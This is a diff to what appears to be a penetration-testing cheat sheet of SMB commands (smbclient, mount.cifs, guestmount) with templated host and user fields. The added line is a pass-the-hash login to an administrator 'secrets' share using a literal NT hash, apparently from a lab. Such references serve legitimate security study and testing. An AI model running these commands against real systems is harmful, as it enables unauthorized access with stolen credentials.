@@ -283,6 +283,7 @@ smbclient //<% tp.frontmatter["RHOST"] %>/SYSVOL -U <% tp.frontmatter["USERNAME"
 smbclient "\\\\<% tp.frontmatter["RHOST"] %>\<SHARE>"
 smbclient \\\\<% tp.frontmatter["RHOST"] %>\\<SHARE> -U '<% tp.frontmatter["USERNAME"] %>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<% tp.frontmatter["RHOST"] %>/<SHARE>
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 mount.cifs //<% tp.frontmatter["RHOST"] %>/<SHARE> /mnt/remote
 guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 
